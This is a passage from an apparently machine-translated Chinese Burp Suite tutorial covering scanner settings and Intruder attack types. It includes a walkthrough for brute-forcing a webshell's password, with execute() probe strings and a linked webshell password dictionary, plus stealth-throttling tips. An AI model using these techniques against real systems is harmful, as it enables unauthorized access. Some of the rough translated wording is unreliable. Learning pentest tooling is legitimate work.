Engine</h3><p>控制用来做主动扫描时发出HTTP请求的引擎。下列选项可用：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121391377.png\" alt=\"Image077\" title=\"image077.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)Number of threads - 控制并发请求数。</span><br><span class=\"line\">2)Number of retries on network failure - 如果出现连接错误或其他网络问题，Burp会放弃和移动之前重试的请求指定的次数。测试时间歇性网络故障是常见的，所以最好是在发生故障时重试该请求了好几次。</span><br><span class=\"line\">3)Pause before retry - 当重试失败的请求，Burp会等待指定的时间（以毫秒为单位）以下，然后重试失败。如果服务器宕机，繁忙，或间歇性的问题发生，最好是等待很短的时间，然后重试。</span><br></pre></td></tr></table></figure>\n\n<p><strong>Throttle between requests</strong> - 在每次请求之前等待一个指定的延迟（以毫秒为单位）。此选项很有用，以避免超载应用程序，或者是更隐蔽。</p>\n<p><strong>Add random variations to throttle</strong> - 通过降低您的要求的时序模式进一步增加隐身。</p>\n<p><strong>Follow redirections where necessary</strong>- 有些漏洞只能通过下面的重定向进行检测（例如，在一条错误消息，跨站点脚本这是只有下列一个重定向后退还）。因为某些应用程序的问题重定向到包含您所提交的参数值的第三方网址，BurpSuite保护您免受无意中攻击的第三方应用程序，不按照刚刚收取任何重定向。如果所扫描的要求是明确的目标范围之内（即您使用的是目标范围，以控制哪些被扫描的），然后BurpSuite只会跟随重定向是指同一范围内。如果所扫描的要求不在范围内（即你已经手动发起超出范围的请求的扫描），BurpSuite只会跟随重定向其中（a）是在同一台主机&#x2F;端口的请求被扫描;及（b）没有明确涵盖的范围排除规则（如“logout.aspx”）。</p>\n<p>小心使用这些选项可让您微调扫描引擎，根据不同应用对性能的影响，并在自己的处理能力和带宽。如果您发现该扫描仪运行缓慢，但应用程序表现良好和你自己的CPU利用率很低，可以增加线程数，让您的扫描进行得更快。如果您发现连接错误发生，该应用程序正在放缓，或者说自己的电脑被锁定了，你应该减少线程数，也许增加网络故障和重试之间的间隔重试的次数。如果应用程序的功能是这样的：在一个基地的要求执行的操作干扰其他请求返回的响应，你应考虑减少线程数为1，以确保只有一个单碱基请求被扫描的时间。</p>\n<h3 id=\"Active-Scanning-Optimization\"><a href=\"#Active-Scanning-Optimization\" class=\"headerlink\" title=\"Active Scanning Optimization\"></a>Active Scanning Optimization</h3><p>主动扫描逻辑的行为，以反映扫描的目的和目标应用程序的性质。例如，您可以选择更容易发现问题，在一个大型应用程序的快速扫描;或者您可以执行更慢全面扫描，以发现更难，而且需要更多的扫描请求，以检测问题。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121341699.png\" alt=\"Image079\" title=\"image079.png\"></p>\n<p>下列选项可用：</p>\n<p><strong>Scan speed(扫描速度)</strong> - 该选项决定彻底的某些扫描检查，怎么会检查是否有漏洞时。 “Fast(快速)”设置使更少的请求，并检查一些漏洞更少的推导。在“Thorough(彻底)”的设置使更多的请求，并检查更多的衍生类型的漏洞。 “Normal(正常)”设定为中途在两者之间，并且代表速度和完整性之间的适当折衷对于许多应用。</p>\n<p><strong>Scan accuracy(扫描精度)</strong> - 此选项决定的证据表明，扫描仪会报告某些类型的漏洞之前，要求的金额。可以只使用“blind(盲)”的技术，其中，Burp推断可能存在基于某些观察到的行为，如时间延迟或一个差分响应的一个漏洞被检测到的一些问题。因为这些观察到的行为的发生原因，无论如何，在没有相关联的漏洞的影响，该技术本身更容易出现假阳性比其他技术，例如在观察错误消息。试图减少误报，BurpSuite重复某些测试了一些，当一个假定的问题，推断时间，尝试建立提交的输入和观察到的行为之间有可靠的相关性。的准确性选项用于控制BurpSuite会多少次重试这些测试。在“Minimize false negatives(最小化假阴性)”的设置进行重试较少，因此更可能报告假阳性的问题，但也不太可能会错过由于不一致的应用程序行为的真正问题。在“Minimize false positives(最小化误报)”设置进行更多的试，所以是不太可能报告假阳性的问题，但可能会因此错误地错过了一些真正的问题，因为有些重试请求可能只是碰巧不返回结果是测试。 “Normal(正常)”设置为中途两者之间，并代表之间的假阳性和假阴性的问题合适的权衡对于许多应用。</p>\n<p><strong>Use intelligent attack selection(使用智能进攻选择)</strong> - 此选项使通过省略出现无关紧要给每个插入点参数的基值支票扫描更有效率。例如，如果一个参数值包含不正常出现在文件名中的字符，BurpSuite会跳过文件路径遍历检查此参数。使用这个选项，可以加快扫描件，具有相对低的存在缺少实际的漏洞的风险。</p>\n<h3 id=\"Active-Scanning-Areas\"><a href=\"#Active-Scanning-Areas\" class=\"headerlink\" title=\"Active Scanning Areas\"></a>Active Scanning Areas</h3><p>定义哪些是主动扫描过程中进行检查。是检查以下类别可供选择：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121323228.png\" alt=\"Image081\" title=\"image081.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL injection(SQL注入) - 这有子选项，以使不同的测试技术（误差为基础，延时测试，布尔条件测试） ，并且也使检查特定于单个数据库类型（ MSSQL ，Oracle和MySQL的） 。</span><br><span class=\"line\">OS command injection(操作系统命令注入) - 这有子选项，以使不同的测试技术.。</span><br><span class=\"line\">Reflected XSS(反映了跨站点脚本)</span><br><span class=\"line\">Stored XSS(存储的跨站点脚本)</span><br><span class=\"line\">File path traversal(文件路径遍历)</span><br><span class=\"line\">HTTP header injection(HTTP头注入)</span><br><span class=\"line\">XML/SOAP injection(XML / SOAP注射)</span><br><span class=\"line\">LDAP injection(LDAP注入)</span><br><span class=\"line\">Open redirection(开放重定向)</span><br><span class=\"line\">Header manipulation(头操纵)</span><br><span class=\"line\">Server-level issues服务器级的问题</span><br></pre></td></tr></table></figure>\n\n<p>所执行的每个检查增加的请求的数目，以及每个扫描的总时间。您可以打开或关闭个别检查根据您的应用程序的技术知识。例如，如果你知道某个应用程序不使用任何LDAP ，您可以关闭LDAP注入测试。如果你知道哪个后端数据库的应用程序使用，你可以关闭SQL注入检测特定于其他类型的数据库。您也可以选择性地启用基于你如何严格要求你的扫描是检查。例如，您可以配置BurpSuite做应用程序的快速一次过，只为XSS和SQL注入的网址和参数检查，每漏洞类型更全面的测试在每一个插入点之前。</p>\n<h3 id=\"Passive-Scanning-Areas\"><a href=\"#Passive-Scanning-Areas\" class=\"headerlink\" title=\"Passive Scanning Areas\"></a>Passive Scanning Areas</h3><p>自定义的请求和响应的各个方面在被动扫描检查。下列选项可用：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121316955.png\" alt=\"Image083\" title=\"image083.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Headers--头 </span><br><span class=\"line\">Forms--表格 </span><br><span class=\"line\">Links--链接 </span><br><span class=\"line\">Parameters--参数 </span><br><span class=\"line\">Cookie </span><br><span class=\"line\">MIME类型 </span><br><span class=\"line\">Caching缓存 </span><br><span class=\"line\">Information disclosure--信息披露 </span><br><span class=\"line\">Frameable responses--耐燃反应（“点击劫持”） </span><br><span class=\"line\">ASP.NET的ViewState </span><br><span class=\"line\">需要注意的是被动扫描不会派出自己的任何要求，和每个被动强加检查您的计算机上一个微不足道的处理负荷。不过，你可以禁用检查各个领域，如果你根本就不关心他们，不希望他们出现在扫描结果。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Intruder\"><a href=\"#Intruder\" class=\"headerlink\" title=\"Intruder\"></a>Intruder</h2><p>Burp intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击。它可以用来自动执行所有类型的任务您的测试过程中可能出现的。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121336510.png\" alt=\"Image085\" title=\"image085.png\"></p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121439648.png\" alt=\"Image087\" title=\"image087.png\"></p>\n<p>要开始去了解BurpSuite Intruder，执行以下步骤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)首先，确保Burp安装并运行，并且您已配置您的浏览器与Burp工作。</span><br><span class=\"line\">2)如果你还没有这样做的话，浏览周围的一些目标应用程序，来填充的应用程序的内容和功能的详细信息Burp的SiteMap。在这样做之前，要加快速度，进入代理服务器选项卡，然后截取子标签，并关闭代理拦截（如果按钮显示为“Intercept is On”，然后点击它来截取状态切换为关闭） 。</span><br><span class=\"line\">3)转到Proxy选项卡，并在History选项卡。发现一个有趣的前瞻性要求，您的目标应用程序，包含了一些参数。选择这个单一的请求，然后从上下文菜单中选择“Send to intruder” 。</span><br><span class=\"line\">4)转到Intruder标签。Burp Intruder可以让你同时配置多个攻击。您Send to Intruder的每个请求在自己的攻击选项卡中打开，而这些都是顺序编号的默认。您可以双击标签头重命名选项卡，拖动标签来重新排序，并且还关闭和打开新的标签页。</span><br><span class=\"line\">5)为您发送请求建立的Intruder选项卡，看看Target和Positions选项卡。这些已经自动填入您发送的请求的细节。</span><br><span class=\"line\">6)Burp Intruder本质工作，采取了基本模板的要求（你送到那里的那个） ，通过一些payloads的循环，将这些payloads送入定义的Positions，基本要求范围内，并发出每个结果的要求。位置标签用于配置，其中有效载荷将被插入到基本要求的位置。你可以看到，BurpSuite一直在你想用来放置有效载荷自动进行猜测。默认情况下，有效载荷放入所有的请求参数和cookie的值。每对有效载荷标记定义了一个有效载荷的位置，并且可以从基体的要求，这将被替换的有效载荷的内容，当该payload position用于括一些文本。有关进一步详情，请参阅Payload Markers的帮助。</span><br><span class=\"line\">7)旁边的请求编辑器中的按钮可以被用于添加和清除有效载荷的标志。试着增加payload position在新的地点请求中，并删除其他标志物，并看到效果了。当你理解了payload positions是如何工作的，请单击“Auto§ ”按钮恢复到BurpSuite为您配置的默认payload positions。如果你修改了请求本身的文本，可以重复步骤3创建与它的原始请求一个新的Intruder的攻击选项卡。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121441372.png\" alt=\"Image089\" title=\"image089.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">8)转到Payloads选项卡。这使您可以定义将要放入已定义的有效载荷仓的有效载荷。保持默认设置（使用有效载荷的“Simple list” ） ，并添加一些测试字符串到列表中。您可以通过输入到“Enter a new item”框中，单击“add”，输入自己的字符串。或者您可以使用“add from file”下拉菜单，然后选择“Fuzzing-quick”，从内置的负载串[专业版]列表中。</span><br><span class=\"line\">9)现在，您已经配置了最低限度的选项来发动攻击。转到Intruder菜单，然后选择“Start attack” 。</span><br><span class=\"line\">10)在包含在结果选项卡一个新的窗口中打开攻击。结果表包含已经取得，与各关键细节，如所使用的有效载荷， HTTP状态码，响应长度等，您可以在表中选择任何项目，以查看完整的请求和响应每个请求的条目。您还可以对表进行排序通过单击列标题，并使用过滤器栏过滤表中的内容。这些特征以相同的方式工作，作为Proxy history。</span><br><span class=\"line\">11)这次袭击窗口包含其他标签，显示被用于当前攻击的配置。您可以修改大部分这种配置的攻击已经开始。转到选项选项卡，向下滚动到“ grep-match” ，并勾选“标志的结果与项目相匹配的响应这些表达式” 。这将导致Intruder检查响应匹配列表中的每个表达式项目和标志的火柴。默认情况下，列表显示fuzzing时是很有用的一些常见的错误字符串，但可以配置，如果你想自己的字符串。返回result选项卡，看到Intruder增加了对每个项目列在列表中，而这些包含复选框，指示表达式是否被发现在每一个响应。如果你是幸运的，你的基本模糊测试可能引发一个错误的存在在一些回应的错误消息。</span><br><span class=\"line\">12)现在，在表中选择任何项目，并期待在该项目的响应。发现在反应（如网页标题，或错误消息）一个有趣的字符串。右键单击该项目在表中，然后从上下文菜单中选择“Define extrace grep from response” 。在对话框中，选择响应的有趣字符串，然后单击“确定” 。结果表中现在包含一个新的列，其提取这一段文字从每个响应（其可以是不同的在每一种情况下） 。您可以使用此功能来定位在大型攻击有趣的数据与成千上万的反应。请注意，您还可以配置“extrace grep ”项目中的选项选项卡，在此之前前或在攻击期间。</span><br><span class=\"line\">13)在结果表中选择任一项目，并打开上下文菜单。选择“Send to Repeater” ，然后转到Repeater选项卡。你会看到所选的请求已被复制到Repeater工具，进行进一步的测试。许多其他有用的选项是可用的上下文菜单中。有关发送BurpSuite工具之间的项目，使整体测试工作流程的详细信息。</span><br><span class=\"line\">14)您可以使用“Save”菜单在结果窗口中都救不结果表或整个攻击。你可以加载结果表到其他工具或电子表格程序。您可以通过在主Burp的UI Intruder菜单重新加载保存的攻击。</span><br><span class=\"line\">15)这些步骤只介绍一个简单的用例Intruder，对于Fuzzing的要求有一些标准的攻击字符串和用grep搜索中的错误消息。您可以使用Intruder许多不同类型的攻击，有许多不同的payloads和攻击选项。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Using-Burp-Intruder\"><a href=\"#Using-Burp-Intruder\" class=\"headerlink\" title=\"Using Burp Intruder\"></a>Using Burp Intruder</h3><p>for example 这里我本地搭建一个环境，爆破一个php大马，如果是一句话就把get改成post，如果是php一句话，就在下面加上php这行代码，如图</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121444235.png\" alt=\"Image091\" title=\"image091.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">asp     password=execute(&quot;response.clear:response.write(&quot;&quot;passwordright&quot;&quot;):response.end&quot;)</span><br><span class=\"line\">php     password=execute(&quot;response.clear:response.write(&quot;&quot;elseHelloWorld&quot;&quot;):response.end&quot;)</span><br><span class=\"line\">aspx    password=execute(&quot;response.clear:response.write(&quot;&quot;elseHelloWorld&quot;&quot;):response.end&quot;)。</span><br></pre></td></tr></table></figure>\n\n<p>一般步骤如下</p>\n<p>1.代理好服务器地址，然后访问这个大马地址</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121481236.png\" alt=\"Image093\" title=\"image093.png\"></p>\n<p>2.随后点击forward,并且在大马页面随便输入什么，burp拦截了数据之后发送到repeater</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121481236.png\" alt=\"Image095\" title=\"image095.png\"></p>\n<p>3.切换到repeater选项卡中，点击go按钮，找出一些反馈的错误信息，当然如果不要也可以，这里找错误信息是方便爆破成功了之后便于发现，我这个马反馈的是中文错误信息，显示是乱码就不写了，我们可以通过爆破成功了之后看字节数。 4.接下来就是发送到intruder，target一般都不需要管，已经自动填好了，然后选择positions</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121567189.png\" alt=\"Image097\" title=\"image097.png\"></p>\n<p>先点击Clear$，选择密码地地方点击add$。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121551234.png\" alt=\"Image099\" title=\"image099.png\"></p>\n<p>5.切换到payloads设置payload type，选择我们自己的字典</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121532703.png\" alt=\"Image101\" title=\"image101.png\"></p>\n<p>6.切换到options去设置进程数和失败之后重试次数、过滤结果</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121554609.png\" alt=\"Image103\" title=\"image103.png\"></p>\n<p>一般我都会把Grep-Match清理掉，省得干扰。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121599797.png\" alt=\"Image105\" title=\"image105.png\"></p>\n<p>7.接下来点击intruder下的start attack就开始爆破了，密码admin，我是根据length来判断跟其他的不同</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121647776.png\" alt=\"Image107\" title=\"image107.png\"></p>\n<p>附赠一个webshell字典：<a href=\"https://wooyun.js.org/images_result/images/2014101711121696735.zip\">shellpassword.txt.zip</a></p>\n<h3 id=\"Target\"><a href=\"#Target\" class=\"headerlink\" title=\"Target\"></a>Target</h3><p>用于配置目标服务器进行攻击的详细信息。所需的选项有： Host(主机) - 这是目标服务器的IP地址或主机名。 Port(端口) - 这是HTTP &#x2F; S服务的端口号。 Use HTTPS(使用HTTPS)，这指定的SSL是否应该被使用。 配置这些细节最简单的方法是选择你要攻击中BurpSuite的任何地方的请求，并选择上下文菜单中的“Send to intruder”选项。这将发送选定的请求，在intruder一个新的选项卡，将自动填充的目标和位置选项卡。</p>\n<h3 id=\"Positions\"><a href=\"#Positions\" class=\"headerlink\" title=\"Positions\"></a>Positions</h3><p>用于配置request temlate的攻击，和payloads markers、attack type一起。</p>\n<h3 id=\"Request-Template\"><a href=\"#Request-Template\" class=\"headerlink\" title=\"Request Template\"></a>Request Template</h3><p>主要请求编辑器是用来定义从所有攻击请求都将被导出的请求模板。对于每一个攻击的请求，BurpSuite接受请求的模板，并把一个或多个有效载荷送入由有效载荷标记定义的位置。 成立请求模板的最简单的方法是选择你要攻击中BurpSuite的任何地方的请求，并选择上下文菜单中的“Send to intruder”选项。这将发送选定的请求，在intruder的选项卡，将自动填充的Target和Positions选项卡。</p>\n<h3 id=\"Payload-Markers\"><a href=\"#Payload-Markers\" class=\"headerlink\" title=\"Payload Markers\"></a>Payload Markers</h3><p>有效载荷的标记是使用§字符，并且功能如下放置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)每对标记指定一个有效载荷的位置。</span><br><span class=\"line\">2)一对标记物可以从它们之间任选的模板要求附上一些文字。</span><br><span class=\"line\">3)当一个有效载荷的位置被分配了一个有效载荷，无论是标记和任何包含的文本将被替换为有效载荷。</span><br><span class=\"line\">4)当一个有效载荷的位置不具有分配的有效载荷，该标记将被删除，但是所包含的文本保持不变。</span><br></pre></td></tr></table></figure>\n\n<p>为了使配置更加简单，Intruder会自动突出显示每对有效载荷的标记和任何它们之间包含的文本。</p>\n<p>您可以手动或自动做有效载荷标记。当您从BurpSuite别处发送一个请求到Intruder，Intruder猜测你可能要放置有效载荷，并设置相应的有效载荷标记。您可以修改使用按钮的默认有效载荷标记旁边的请求模板编辑器：</p>\n<p>Add§ - 如果没有文本被选中，该插入一个有效载荷标记在光标位置。如果您已经选择了一些文字，一对标记插入封闭选定的文本。 Clear§ - 这将删除所有的位置标记，无论是从整个模板或模板的选定部分。 Auto§ - 自动放置有效载荷标记。包括价值：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)URL查询字符串参数</span><br><span class=\"line\">2)车身参数</span><br><span class=\"line\">3)曲奇饼</span><br><span class=\"line\">4)多重参数属性（例如，在文件上传的文件名）</span><br><span class=\"line\">5)XML数据和元素属性</span><br><span class=\"line\">6)JSON参数</span><br></pre></td></tr></table></figure>\n\n<p>您可以配置自动负载位置是否将更换或追加到现有的参数值，通过入侵者菜单上的选项。需要注意的是，如果一个子部分的要求，但不是整个消息体，包含格式化数据使用XML或JSON ，可以自动通过这种结构中的位置的有效载荷手动选择格式化数据的准确块，并使用“自动”按钮在其定位的有效载荷。这是有用的，例如，当一个多参数的值包含在XML或JSON格式数据。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">刷新 - 这将刷新请求模板编辑器的语法彩色化，如果必要的。</span><br><span class=\"line\">清除 - 这会删除整个请求模板。</span><br></pre></td></tr></table></figure>\n\n<p>注意：您也可以使用入侵者的有效载荷仓的UI通过BurpSuite扫描仪配置自定义插入点主动扫描。要做到这一点，配置请求模板和有效载荷在标记内入侵者通常的方式，然后选择从入侵者菜单中的“主动扫描定义插入点” 。</p>\n<h3 id=\"Attack-type\"><a href=\"#Attack-type\" class=\"headerlink\" title=\"Attack type\"></a>Attack type</h3><p>Burp Intruder支持各种攻击类型 - 这些决定在何种负载分配给有效载荷仓的方式。攻击类型可以使用请求模板编辑器上方的下拉菜单进行选择。以下攻击类型可供选择：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121998569.png\" alt=\"Image109\" title=\"image109.png\"></p>\n<p>Sniper(狙击手) - 这将使用一套单一的payloads。它的目标依次在每个有效载荷的位置，并把每个有效载荷送入依次那个位置。这不是针对一个给定的请求的位置不受影响 - 位置标记被移除，并在它们之间出现在模板中任何封闭文本保持不变。这种攻击类型为个别模糊测试的一些请求参数常见的漏洞非常有用。在攻击中生成的请求的总数是位置的数目和在有效载荷中设定的有效载荷的数量的乘积。</p>\n<p>Battering ram(撞击物) - 使用一组payload。通过迭代的有效载荷方式，并将相同的payloads再一次填充到所有已定义的有效载荷仓。当其中一个攻击需要相同的输入将被插入在多个地方在请求中（例如，一个Cookie中的用户名和cookie参数）对这种攻击类型是非常有用的。在攻击中生成的请求的总数是有效载荷的有效载荷中设定的数目。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121992842.png\" alt=\"Image111\" title=\"image111.png\"></p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121957831.png\" alt=\"Image113\" title=\"image113.png\"></p>\n<p>例如生成一组数字1-9，则就是1-1 ，2-2，3-3这种形式 Pitchfork(相交叉) - 这将使用多个payloads集。有对每个定义的位置（最多20个）不同的有效载荷组。通过设置所有有效载荷的攻击迭代的方式，并将一个有效载荷到每个定义的位置。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122127325.png\" alt=\"Image115\" title=\"image115.png\"></p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122150222.png\" alt=\"Image117\" title=\"image117.png\"></p>\n<p>例如设置多个，每个payload设置一个字典，则就是1-1-1，2-2-2，3-3-3这种形式</p>\n<p>换句话说，第一个请求将放置第一个有效载荷的Payload set 1到Positions 1 ，并从有效载荷中的第一个Payload set 2到Positons 2 ;第二个请求将放置第二个Payload set 1到Positions 1 ，并从payload中的第二个Payload set 2到Postions2 ，等在那里的攻击需要不同但相关的输入进行插在多个地方，这种攻击类型是有用的请求（例如，用户名中的一个参数，和对应于该用户名中的另一个参数已知的ID号） 。在攻击中生成的请求的总数是有效载荷中的最小有效载荷组的数目。</p>\n<p>Cluster bomb(集束炸弹) - 使用多个Payload sets。有对每个定义的Positions（最多20个）设置不同的payload set。通过每个有效载荷的攻击迭代依次设置，使有效载荷组合的所有排列进行测试。</p>\n<p>例如设置三个字典都是10个数，则总共有1000总匹配的模式</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122189353.png\" alt=\"Image119\" title=\"image119.png\"></p>\n<p>也就是说，如果有两个有效载荷的位置，则该攻击将放置第一个有效载荷从payload set 2到Positions 2 ，并通过在有效负载的所有 payload set 1中的positions 1 ;然后它将第二个有效载荷从载荷设置2到位置2 ，并通过有效载荷全部载入循环设置1到位置1 。其中一个攻击需要不同的和无关的或未知输入要在多个地方插入这种类型的攻击是非常有用的在请求中（例如猜测凭证，在一个参数的用户名，并且在另一个参数密码时） 。在攻击中生成的请求的总数是在所有定义的有效载荷的有效载荷集的数目的乘积 - 这可能是非常大的。</p>\n<h2 id=\"Payloads\"><a href=\"#Payloads\" class=\"headerlink\" title=\"Payloads\"></a>Payloads</h2><h3 id=\"Types\"><a href=\"#Types\" class=\"headerlink\" title=\"Types\"></a>Types</h3><p>Burp Intruder包含以下几种attack type:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Simple list--简单字典</span><br><span class=\"line\">Runtime file--运行文件</span><br><span class=\"line\">Custom iterator--自定义迭代器</span><br><span class=\"line\">Character substitution--字符替换</span><br></pre></td></tr></table></figure>\n\n<p>此负载类型允许您配置一个字符串列表，并应用各种字符替换到每个项目。这可能是在密码猜测攻击非常有用，用来产生在字典中的单词常见的变化。 用户界面允许您配置了一些字符替换。当执行攻击，有效载荷类型工程通过逐一配置的列表项。对于每个项目，它产生一个数的有效载荷，根据所定义的取代基包括取代的字符的所有排列。例如，默认替换规则（其中包括e&gt;3且t&gt;7），该项目“peter”将产生以下的有效载荷：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">peter</span><br><span class=\"line\">p3ter</span><br><span class=\"line\">pe7er</span><br><span class=\"line\">p37er</span><br><span class=\"line\">pet3r</span><br><span class=\"line\">p3t3r</span><br><span class=\"line\">pe73r</span><br><span class=\"line\">p373r</span><br></pre></td></tr></table></figure>\n\n<p>Case modification–此负载类型允许您配置一个字符串列表，并应用各种情况下修改每个项目。这可能是密码猜测攻击非常有用，用来产生在字典中的单词的情况下的变化。 可以选择以下的情况下修改规则：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">No change - 这个项目可以用不被修改。 </span><br><span class=\"line\">To lower case- 在该项目的所有字母转换为小写。 </span><br><span class=\"line\">To upper case - 在该项目的所有字母转换为大写。 </span><br><span class=\"line\">To Propername - 在该项目的第一个字母转换为大写，以及随后的字母转换为小写。 </span><br><span class=\"line\">To ProperName - 在该项目的第一个字母转换为大写，以及随后的字母都不会改变。</span><br></pre></td></tr></table></figure>\n\n<p>例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Peter Wiener</span><br><span class=\"line\">peter wiener</span><br><span class=\"line\">PETER WIENER</span><br><span class=\"line\">Peter wiener</span><br></pre></td></tr></table></figure>\n\n<p>选项：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Recursive grep--递归grep</span><br><span class=\"line\">Illegal Unicode--非法的Unicode</span><br><span class=\"line\">Character blocks--字符块</span><br><span class=\"line\">Numbers--数字</span><br><span class=\"line\">Dates--日期</span><br><span class=\"line\">Brute forcer--暴力</span><br><span class=\"line\">Null payloads--空的有效负载</span><br><span class=\"line\">Character frobber--性格frobber</span><br><span class=\"line\">Bit flipper--位翻转</span><br><span class=\"line\">Username generator--用户名生成器</span><br><span class=\"line\">ECB block shuffler--欧洲央行座洗牌</span><br><span class=\"line\">Extension-generated--扩展生成</span><br><span class=\"line\">Copy other payload--复制其它有效负载</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Processing\"><a href=\"#Processing\" class=\"headerlink\" title=\"Processing\"></a>Processing</h3><p>由配置的有效载荷类型生成的有效载荷可以使用各种有效载荷的处理规则和有效负载编码可以进一步操纵。</p>\n<h4 id=\"1-Payload-Processing-Rules\"><a href=\"#1-Payload-Processing-Rules\" class=\"headerlink\" title=\"1)Payload Processing Rules\"></a>1)Payload Processing Rules</h4><p>在它被使用之前可以定义规则来对每个有效载荷执行各种处理任务。该定义的规则按顺序执行，并且可以打开和关闭，以帮助调试与配置的任何问题。有效载荷的处理规则是有用的在多种情况下，你需要生成不同寻常的有效载荷，或者需要在一个更广泛的结构或在使用前编码方案包的有效载荷可达。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122171902.png\" alt=\"Image121\" title=\"image121.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span 